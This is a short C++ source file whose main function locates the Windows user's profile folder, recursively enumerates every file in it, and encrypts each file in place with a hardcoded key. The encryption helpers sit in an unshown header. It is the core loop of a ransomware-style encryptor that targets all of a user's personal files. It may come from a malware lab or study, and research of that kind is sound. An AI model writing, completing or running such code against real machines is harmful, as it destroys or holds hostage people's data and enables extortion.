#include "encrypt.h"

int main() {
    // Get the path to the user's profile folder
    TCHAR userProfileDir[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userProfileDir))) {
        // Print the user's profile folder path using wide character output
        std::wcout << L"User's profile folder: " << userProfileDir << std::endl;

        // Create a vector to store file paths
        std::vector<std::wstring> fileList;

        // Convert TCHAR array to std::wstring and recursively enumerate all files
        std::wstring userProfileDirW(userProfileDir);
        EnumerateFilesRecursive(userProfileDirW, fileList);

        // Encrypt each file with the specified key
        LPCTSTR key = TEXT("3igcZhRdWq96m3GUmTAiv9");
        std::wcout << L"Beginning encryption" << std::endl;
        for (const auto& file : fileList) {
            //std::wcout << L"Encrypting file: " << file << std::endl; // Print the file being encrypted
            if (!EncryptFileWithKey(file.c_str(), key)) {
                std::wcerr << L"Failed to encrypt file: " << file << std::endl;
            }
        }
    } else {
        // Failed to get the user's profile folder path
        std::wcerr << L"Failed to get user's profile folder." << std::endl;
        return EXIT_FAILURE;
    }

    // Wait for user input before exiting
    std::wcin.get();

    return EXIT_SUCCESS;
}
